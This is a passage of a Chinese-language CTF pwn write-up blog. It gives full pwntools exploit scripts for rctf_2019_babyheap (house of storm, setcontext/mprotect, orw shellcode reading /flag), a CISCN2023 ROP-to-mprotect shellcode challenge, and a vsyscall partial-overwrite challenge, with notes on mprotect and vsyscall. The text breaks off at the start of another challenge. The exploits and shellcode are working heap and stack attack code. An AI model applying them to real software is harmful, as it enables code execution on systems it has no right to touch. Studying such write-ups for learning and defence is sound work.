</span><br></pre></td></tr></table></figure><h3 id="rctf-2019-babyheap"><a href="#rctf-2019-babyheap" class="headerlink" title="rctf_2019_babyheap"></a>rctf_2019_babyheap</h3><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/rctf&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>有沙盒只能orw,且程序<code>mallopt(1,0)</code>禁用了fastbin</p><p>edit存在一个off-by-null</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(_BYTE *)(*((_QWORD *)ptrs + <span class="number">2</span> * (<span class="type">int</span>)v1)</span><br><span class="line">          + (<span class="type">int</span>)read_n(*((<span class="type">void</span> **)ptrs + <span class="number">2</span> * (<span class="type">int</span>)v1), *((_DWORD *)ptrs + <span class="number">4</span> * (<span class="type">int</span>)v1 + <span class="number">2</span>))) = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>这题利用还用到了house of storm</p><p>此外程序分配内存使用的callloc,会将分配出来的内存置0</p><p><strong>利用思路:</strong></p><ol><li>先利用house of storm将free_hook-0x20作为一个chunk分配出来</li><li>往free_hook写上<code>setcontext +(free_hook+0x18)*2 + shellcode1</code>其中setcontext的内容为调用mprotect将free_hook所在页的权限修改,并修改rsp为free_hook后方并返回,shellcode1因为长度有限需要二次调用,故shellcode1为向free_hook所在段读入数据并jmp到此处</li><li>将setcontext结构所需数值保存到一个chunk中并free该chunk</li><li>发送真正的orw-shellcode2</li></ol><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./rctf_2019_babyheap&#x27;</span>)</span><br><span class="line">context.binary=<span class="string">&#x27;./rctf_2019_babyheap&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&quot;Choice: \n&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">p.recvuntil(menu)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">p.recvuntil(menu)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">p.recvuntil(menu)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">p.recvuntil(menu)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Content: &quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x100</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">malloc_hook= u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x58</span> - <span class="number">0x10</span></span><br><span class="line">libc.address=malloc_hook-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">set_context = libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">add(<span class="number">0x160</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x508</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x508</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">delete(<span class="number">5</span>)<span class="comment">#6&#x27;s prev_inuse be 0</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)<span class="comment">#size(0x510)-&gt;size(0x500),therefore set_inuse will set in a incorrect location,so 6&#x27;s prev_inuse will always be 0</span></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x4d8</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)<span class="comment">#so uaf</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x4e8</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">delete(<span class="number">8</span>)     <span class="comment">#again</span></span><br><span class="line">edit(<span class="number">7</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x4d8</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4e8</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line"></span><br><span class="line">fake_chunk=free_hook-<span class="number">0x20</span></span><br><span class="line">edit(<span class="number">11</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) + p64(<span class="number">0</span>) + p64(fake_chunk))</span><br><span class="line">edit(<span class="number">12</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) + p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>) +p64(<span class="number">0</span>) + p64(fake_chunk-<span class="number">0x18</span>-<span class="number">5</span>))</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">dbg()</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#up to now all do for house of storm</span></span><br><span class="line"></span><br><span class="line">new_addr =  free_hook &amp;<span class="number">0xFFFFFFFFFFFFF000</span></span><br><span class="line"></span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rsi,%d</span></span><br><span class="line"><span class="string">mov edx,0x1000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax,0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % new_addr</span><br><span class="line"><span class="comment">#read..</span></span><br><span class="line">edit(<span class="number">6</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(set_context+<span class="number">53</span>)+p64(free_hook+<span class="number">0x18</span>)*<span class="number">2</span>+asm(shellcode1))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = free_hook+<span class="number">0x10</span></span><br><span class="line">frame.rdi = new_addr</span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">7</span></span><br><span class="line">frame.rip = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">edit(<span class="number">12</span>, <span class="built_in">str</span>(frame))</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">shellcode2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x67616c662f ;// /flag</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rsp ;// /flag</span></span><br><span class="line"><span class="string">mov rsi, 0 ;// O_RDONLY</span></span><br><span class="line"><span class="string">xor rdx, rdx ;</span></span><br><span class="line"><span class="string">mov rax, 2 ;// SYS_open</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rax ;// fd </span></span><br><span class="line"><span class="string">mov rsi,rsp  ;</span></span><br><span class="line"><span class="string">mov rdx, 1024 ;// nbytes</span></span><br><span class="line"><span class="string">mov rax,0 ;// SYS_read</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1 ;// fd </span></span><br><span class="line"><span class="string">mov rsi, rsp ;// buf</span></span><br><span class="line"><span class="string">mov rdx, rax ;// count </span></span><br><span class="line"><span class="string">mov rax, 1 ;// SYS_write</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 0 ;// error_code</span></span><br><span class="line"><span class="string">mov rax, 60</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.sendline(asm(shellcode2))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行结果,每次运行只有一定概率成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">aichch@sword-shield:~/桌面/pwn$ python 3.py</span><br><span class="line">[+] Starting local process &#x27;./rctf&#x27;: pid 27043</span><br><span class="line">[*] &#x27;/home/aichch/pwn/rctf&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] &#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] libc_base:0x7fa0b43a0000</span><br><span class="line">0x7fa0b4766000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process &#x27;./rctf&#x27; stopped with exit code 0 (pid 27043)</span><br><span class="line">flag&#123;test&#125;[*] Got EOF while reading in interactive</span><br><span class="line">$ </span><br><span class="line">[*] Interrupted</span><br></pre></td></tr></table></figure><h1 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h1><h2 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h2><p><code>mprotect</code> 是一个系统调用，用于更改指定内存区域的保护属性，包括读、写、执行权限。它通常在操作系统中用于管理内存的访问权限，以增强程序的安全性和灵活性。在C语言中，<code>mprotect</code> 的原型如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int mprotect(void *addr, size_t len, int prot);</span><br></pre></td></tr></table></figure><ul><li><p><code>addr</code>：指向目标内存区域起始地址的指针。</p></li><li><p><code>len</code>：内存区域的长度（以字节为单位）。</p></li><li><p><code>prot</code>：要设置的保护属性，使用以下标志的按位或组合：</p><ul><li><code>PROT_NONE</code>：禁止对内存区域的任何访问。0</li><li><code>PROT_READ</code>：允许读取内存区域的内容。4</li><li><code>PROT_WRITE</code>：允许写入内存区域的内容。2</li><li><code>PROT_EXEC</code>：允许在内存区域中执行代码。1</li></ul></li></ul><p><code>mprotect</code> 的作用在于修改指定内存区域的访问权限，从而允许或禁止不同类型的访问。这对于实现一些特定的内存保护机制非常有用，例如：</p><ol><li><strong>代码段保护</strong>：在程序运行时，将代码段设置为只执行（<code>PROT_EXEC</code>），以防止恶意代码注入并执行。</li><li><strong>数据段保护</strong>：可以将某些敏感数据区域设置为只读（<code>PROT_READ</code>），防止在不合适的情况下被修改。</li><li><strong>动态内存分配保护</strong>：在使用动态内存分配函数（如<code>malloc</code>）分配内存后，可以使用<code>mprotect</code> 来限制对该内存区域的访问权限，从而确保只有特定的操作可以修改或执行该内存。</li></ol><h2 id="在pwn中的利用"><a href="#在pwn中的利用" class="headerlink" title="在pwn中的利用"></a>在pwn中的利用</h2><p>一般都是利用其修改某一块内存权限为rwx,然后去执行shellcode</p><h3 id="例ciscn2023-烧烤摊儿"><a href="#例ciscn2023-烧烤摊儿" class="headerlink" title="例ciscn2023 烧烤摊儿"></a>例ciscn2023 烧烤摊儿</h3><p>常规做法原本是ret2syscall构造rop链</p><p>但这道题没有pie且有使用mprotect函数</p><p>所以可以修改bss段上的空白内存的权限,再往里面写入shellcode,之后返回该处执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#binary = &#x27;./shaokao&#x27;</span></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./shaokao&#x27;)</span></span><br><span class="line">s = <span class="keyword">lambda</span> buf: io.send(buf)</span><br><span class="line">sl = <span class="keyword">lambda</span> buf: io.sendline(buf)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim, buf: io.sendafter(delim, buf)</span><br><span class="line">sal = <span class="keyword">lambda</span> delim, buf: io.sendlineafter(delim, buf)</span><br><span class="line">shell = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">r = <span class="keyword">lambda</span> n=<span class="literal">None</span>: io.recv(n)</span><br><span class="line">ra = <span class="keyword">lambda</span> t=tube.forever:io.recvall(t)</span><br><span class="line">ru = <span class="keyword">lambda</span> delim: io.recvuntil(delim)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">rls = <span class="keyword">lambda</span> n=<span class="number">2</span>**<span class="number">20</span>: io.recvlines(n)</span><br><span class="line">su = <span class="keyword">lambda</span> buf,addr:io.success(buf+<span class="string">&quot;==&gt;&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=remote(&quot;node2.anna.nssctf.cn&quot;,28568)</span></span><br><span class="line">io = process(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">sl(<span class="built_in">str</span>(-<span class="number">1000000</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">read=<span class="number">0x457DC0</span><span class="comment">#elf.symbols[&#x27;read&#x27;]</span></span><br><span class="line">mprotect=<span class="number">0x458B00</span><span class="comment">#elf.symbols[&#x27;mprotect&#x27;]</span></span><br><span class="line">pop_rsi=<span class="number">0x40a67e</span></span><br><span class="line">pop_rdx_rbx=<span class="number">0x4a404b</span></span><br><span class="line">pop_rdi=<span class="number">0x40264f</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">ru(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">ru(<span class="string">&quot;请赐名：&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span>+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0x4E8000</span>)<span class="comment">#第一个参数addr，0x4E8000是bss段上的一块空白区域</span></span><br><span class="line">payload+=p64(pop_rsi)+p64(<span class="number">0x1000</span>)<span class="comment">#第二个参数len</span></span><br><span class="line">payload+=p64(pop_rdx_rbx)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(mprotect)<span class="comment">#第三个参数prot以及函数调用</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0</span>)<span class="comment">#read的第一个参数，0代表从用户输入的值中读取</span></span><br><span class="line">payload+=p64(pop_rsi)+p64(<span class="number">0x4E8000</span>)<span class="comment">#read的第二个参数，代表数据输入到的地址</span></span><br><span class="line">payload+=p64(pop_rdx_rbx)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read)<span class="comment">#read的第三个参数输入大小和read函数调用</span></span><br><span class="line">payload+=p64(<span class="number">0x4E8000</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">0x4E8000</span>)+p64(pop_rsi)+p64(<span class="number">0x1000</span>)+p64(pop_rdx_rbx)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(mprotect)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(<span class="number">0x4E8000</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read)+p64(<span class="number">0x4E8000</span>)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">sl(shellcode)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><h1 id="vsyscall"><a href="#vsyscall" class="headerlink" title="vsyscall"></a>vsyscall</h1><p>gdb运行程序的时候会发现无论是否开启pie和aslr,内存<code>ffffffffff600000-ffffffffff601000</code>处一定是属于<code>vsyscall</code></p><p>将这块内存<code>dump memory ./dump ffffffffff600000 ffffffffff601000</code>dump下来查看,可以发现</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/13348817-23d78409dea3408f.webp" alt=""></p><p>内部是三个系统调用并跟随着retn</p><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>可以看到这里面存在syscall。但<strong>并不能将其当作syscall</strong>进行使用——这是因为vsyscall执行时会进行检查，如果不是从函数开头执行的话就会出错。因此我们仅仅可以使用0xffffffffff600000, 0xffffffffff600400，0xffffffffff600800这三个地址，而这三个地址处对应的函数，我们可以简单地将其看作一个retn指令——也就是说，我们可以通过覆盖返回地址为上面分分析到的三个地址，从而改变栈的布局。</p><p><strong>需要特别说明的是，vsyscall在某些linux版本上可能并不存在</strong></p><p>vsyscall的利用其实就是在程序地址随机化的情况下,通过在栈上寻找仅有部分比特位与我们需要的返回地址不同的地址信息,通过溢出部分写修改该地址,然后将vsyscall视为一个已知地址的gadget使返回地址一步步移动到所修改处</p><p>其实还是栈溢出的简单利用</p><p><strong>把vsyscall视为一个固定地址的ret-gadget</strong></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="magic-number"><a href="#magic-number" class="headerlink" title="magic_number"></a>magic_number</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_9A0(a1, a2, a3);</span><br><span class="line">  v5 = rand();</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">305419896</span> )</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your Input :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>因为pie的存在,且程序简单没有输出几乎难以利用</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-07-25_172833.png" alt=""></p><p>观察栈上可以发现有与我们所需要的地址只差最后8比特位的地址</p><p>只要修改它并通过vsyscall返回到该处即可getshell</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;magic_number&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;magic_number&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+<span class="string">b&#x27;\xA8&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your Input :\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="1000levels"><a href="#1000levels" class="headerlink" title="1000levels"></a>1000levels</h3><p>非常有意思的一道题</p><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td 